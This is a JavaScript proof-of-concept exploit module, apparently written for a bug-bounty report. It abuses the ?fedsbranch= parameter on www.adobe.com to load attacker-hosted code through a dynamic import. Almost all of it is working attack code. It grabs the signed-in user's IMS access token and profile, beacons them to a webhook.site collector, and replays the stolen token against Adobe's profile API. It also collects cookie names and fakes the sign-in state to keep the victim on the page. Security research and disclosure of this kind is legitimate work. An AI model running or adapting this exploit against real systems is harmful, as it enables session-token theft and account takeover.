// Committed at:  libs/global-navigation/dist/main.js  in the PROJECT repo github.com/hoodhmnd/poc
// GitHub Pages serves a project repo under its own name, so the module URL is
//   https://hoodhmnd.github.io/poc/libs/global-navigation/dist/main.js
// (confirmed: hoodhmnd.github.io/ returns 404 - there is no user-site repo - while
//  hoodhmnd.github.io/poc/evil.js returns 200)
//
// Therefore the payload carries the /poc prefix:
//   https://www.adobe.com/?fedsbranch=hoodhmnd.github.io%2fpoc%2fx%23
//
// The %2f ends the authority, the %23 truncates the template's trailing decoration, and the
// block's own new URL(...) resolution then appends libs/global-navigation/dist/main.js.
//
// Reached only because www.adobe.com interpolates ?fedsbranch= into the authority of the URL
// it hands to await import(). Ordering matters: on a SIGNED-IN victim, Milo redirects the
// document to /home shortly after IMS resolves, so the token grab and its beacon run FIRST,
// synchronously, before any DOM work.

// GitHub Pages is static: it cannot receive the exfil. The collector must be an endpoint that
// accepts POST. This one is reporter-controlled (webhook.site) and verified to record bodies.
const COLLECTOR = 'https://webhook.site/86b8e563-613b-43e4-8e58-9a61e4c7c991/steal';

function post(o) {
  const s = JSON.stringify(o);
  try { const x = new XMLHttpRequest(); x.open('POST', COLLECTOR, false); x.send(s); } catch (e) {}
  try { navigator.sendBeacon(COLLECTOR, new Blob([s], { type: 'text/plain' })); } catch (e) {}
}

function claimsOf(tok) {
  try {
    const b = tok.split('.')[1].replace(/-/g, '+').replace(/_/g, '/');
    const j = JSON.parse(atob(b + '='.repeat((4 - (b.length % 4)) % 4)));
    return { user_id: j.user_id, aa_id: j.aa_id, client_id: j.client_id, type: j.type,
             sid: j.sid, as: j.as, expires_in: j.expires_in, created_at: j.created_at,
             scopeCount: (j.scope || '').split(',').length, scope: (j.scope || '').slice(0, 500) };
  } catch (e) { return { err: 'decode:' + e.message }; }
}

let captured = false;

function grabAndSend(phase) {
  if (captured) return true;
  let ims;
  try { ims = window.adobeIMS; } catch (e) { return false; }
  if (!ims) return false;
  let tok;
  try { const t = ims.getAccessToken && ims.getAccessToken(); tok = t && (t.token || t); } catch (e) { return false; }
  if (!tok) return false;
  tok = String(tok);
  captured = true;

  let prof = {};
  try { prof = (ims.getProfile && ims.getProfile()) || {}; } catch (e) {}

  post({
    marker: 'IMS_TOKEN_CAPTURED_BY_ATTACKER_MODULE', phase,
    executedIn: location.origin, href: location.href, moduleUrl: import.meta.url,
    tokenLength: tok.length, tokenPrefix: tok.slice(0, 24), claims: claimsOf(tok),
    token: tok,   // full value - d0x's own test account, authorized 2026-07-30. Redact in the report.
    email: prof.email || null, userId: prof.userId || prof.account_id || null,
    signedIn: (() => { try { return !!(ims.isSignedInUser && ims.isSignedInUser()); } catch (e) { return null; } })(),
    ts: new Date().toISOString(),
  });

  // token is in hand; Milo's "signed-in -> /home" redirect keys off IMS state, so lie to the
  // page to keep the victim on this document. The proof above is already exfiltrated.
  try { ims.isSignedInUser = () => false; } catch (e) {}

  // corroboration: exercise the token read-only against Adobe's own profile API, from the
  // victim's browser, and report the identity it resolves to
  try {
    const key = (ims.adobeIdData && ims.adobeIdData.client_id) || 'homepage_milo';
    fetch('https://pps.adobe.io/api/profile', { headers: { Authorization: 'Bearer ' + tok, 'x-api-key': key } })
      .then((r) => r.text().then((t) => ({ st: r.status, t })))
      .then(({ st, t }) => {
        let u = {};
        try { const j = JSON.parse(t); u = j.user || j || {}; } catch (e) {}
        post({ marker: 'STOLEN_TOKEN_AUTHORIZED_AS_VICTIM', status: st, apiKey: key,
               email: u.email || null, userId: u.userId || u.account_id || null,
               displayName: u.displayName || null, first: u.first_name || null,
               last: u.last_name || null, bodyHead: t.slice(0, 260), ts: new Date().toISOString() });
      })
      .catch((e) => post({ marker: 'PPS_CALL_FAILED', err: String(e).slice(0, 200) }));
  } catch (e) {}
  return true;
}

// 1. immediate attempt, before anything else
const hitFirstTry = grabAndSend('module-eval');

// 2. retry until IMS resolves (a signed-out victim never satisfies this)
const started = Date.now();
const poll = setInterval(() => {
  if (grabAndSend('poll') || Date.now() - started > 25000) {
    clearInterval(poll);
    if (!captured) {
      post({ marker: 'IMS_TOKEN_NOT_OBTAINED', waitedMs: Date.now() - started,
             adobeIMS: typeof window.adobeIMS, href: location.href, ts: new Date().toISOString() });
    }
  }
}, 20);
try { window.addEventListener('pagehide', () => grabAndSend('pagehide'), true); } catch (e) {}

// 3. the same-origin facts, and the visible proof for the screenshot
const evidence = { marker: 'FEDSBRANCH_MODULE_EXECUTED', executedIn: location.origin,
  href: location.href, moduleUrl: import.meta.url, hitFirstTry, ts: new Date().toISOString() };
try { evidence.documentDomain = document.domain; } catch (e) {}
try {
  const c = document.cookie ? document.cookie.split('; ') : [];
  evidence.cookieCount = c.length;                  // NAMES only, never values
  evidence.cookieNames = c.map((x) => x.split('=')[0]).slice(0, 40);
} catch (e) {}
try { evidence.hasAdobeIMS = typeof window.adobeIMS; } catch (e) {}
window.__FEDSBRANCH = evidence;
post(evidence);

try { document.title = 'PWNED_VIA_FEDSBRANCH'; } catch (e) {}
try {
  const d = document.createElement('div');
  d.id = 'fedsbranch-pwned';
  d.setAttribute('style', 'position:fixed;z-index:2147483647;top:0;left:0;right:0;background:#c00;'
    + 'color:#fff;font:14px/1.6 monospace;padding:12px;white-space:pre-wrap');
  d.textContent = 'Arbitrary JavaScript from an attacker-controlled host is executing here\n'
    + 'origin      ' + location.origin + '\n'
    + 'module from ' + import.meta.url + '\n'
    + 'IMS token captured: ' + captured;
  (document.body || document.documentElement).appendChild(d);
} catch (e) {}

// Adobe's block does `const { main } = await import(url)` then calls main({...first-party config}),
// so this export must exist and must return a promise - it chains .catch() on the result.
export function main(opts) {
  const o = opts || {};
  const mc = o.miloConfig || {};
  const info = {
    marker: 'ADOBE_CODE_CALLED_ATTACKER_MAIN', executedIn: location.origin,
    optionKeys: Object.keys(o), miloConfigKeys: Object.keys(mc).slice(0, 60),
    imsClientId: mc.imsClientId || null,
    mountpointTag: (o.mountpoint && o.mountpoint.tagName) || null,
    gnavSource: o.gnavSource ? String(o.gnavSource) : null, ts: new Date().toISOString(),
  };
  window.__FEDSBRANCH_MAIN = info;
  grabAndSend('adobe-called-main');
  post(info);
  return Promise.resolve(info);
}
export default { main };
